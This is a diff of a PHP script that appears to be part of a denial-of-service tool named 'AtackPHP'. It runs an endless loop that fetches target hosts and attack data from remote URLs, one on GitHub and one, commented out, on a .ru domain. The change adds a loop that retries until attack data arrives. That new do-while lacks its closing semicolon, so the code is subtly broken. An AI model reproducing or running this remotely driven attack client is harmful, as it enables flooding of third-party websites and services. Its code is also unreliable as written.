@@ -5,6 +5,7 @@
 
     $sessionMaxRequests = 5000;
 
+    //$hosts = json_decode(file_get_contents('http://rockstarbloggers.ru/hosts.json'), true);
     $hosts = json_decode(file_get_contents('https://raw.githubusercontent.com/DanylovkyiAM/AtackPHP/main/hosts.json'), true);
 
     while (true) {
@@ -12,12 +13,20 @@
             // отримую дані для атаки
             echo "GET DATA \n";
             $count = 0;
+            /*
             $data = @file_get_contents($hosts[array_rand($hosts)]);
 
             if(!$data){
                 echo "Waiting...\n";
                 sleep(5);
             }
+            */
+            
+            do {
+                $data = @file_get_contents($hosts[array_rand($hosts)]);
+                echo "Waiting...\n";
+                sleep(5);
+            } while (!$data)
 
             $data = json_decode($data, true);
 
